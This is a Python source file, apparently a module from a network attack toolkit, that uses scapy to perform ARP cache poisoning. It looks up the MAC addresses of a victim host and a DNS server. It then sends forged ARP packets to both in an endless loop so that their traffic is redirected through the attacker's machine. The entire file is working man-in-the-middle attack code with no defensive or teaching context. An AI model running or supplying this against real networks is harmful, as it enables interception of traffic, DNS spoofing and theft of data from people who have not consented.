import sys
import os
from scapy.all import *
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from attack_status import ATTACK_STATUS

def arp():

	print("Starting ARP Bombing")

	self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))

	if not self_mac:
		return

	#recovery of the victim's MAC address
	arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["victims"])
	mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
	if mac_victim[0]:
		mac_victim = mac_victim[0][0][1].hwsrc
	else:
		return

	#retrieving MAC address from DNS server
	arp_resolver_package_dns = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["dns"])
	mac_dns = srp(arp_resolver_package_dns, timeout=2, verbose=False)

	if mac_dns[0]:
		mac_dns = mac_dns[0][0][1].hwsrc
	else:
		return

	#creation of ARP poisoning packets
	p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['victims']);
	p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['victims'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);

	#poisonloop
	while True:

			sendp(p1, iface=str(ATTACK_STATUS['iface']), verbose=False)
			sendp(p2, iface=str(ATTACK_STATUS['iface']), verbose=False)
			time.sleep(1)

			

			
